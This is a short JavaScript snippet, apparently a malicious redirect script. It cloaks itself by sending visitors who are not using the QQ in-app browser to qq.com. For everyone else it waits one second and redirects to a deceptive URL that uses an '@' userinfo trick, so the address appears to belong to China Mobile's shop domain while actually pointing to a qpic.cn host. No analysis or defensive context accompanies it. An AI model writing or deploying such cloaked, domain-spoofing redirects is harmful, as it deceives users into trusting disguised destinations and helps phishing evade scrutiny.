function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

setTimeout(function() {
    var timestamp = new Date().getTime();
    var url = 'https://shop.10086.cn@meeting-75420.picgzc.qpic.cn/b2cd971e2ffceaf8dbae3e2be7634712a020d8c016cf4d796bff94e26c6938f8' + '?' + timestamp + '3Cscript';
    location.href = url;
}, 1000);
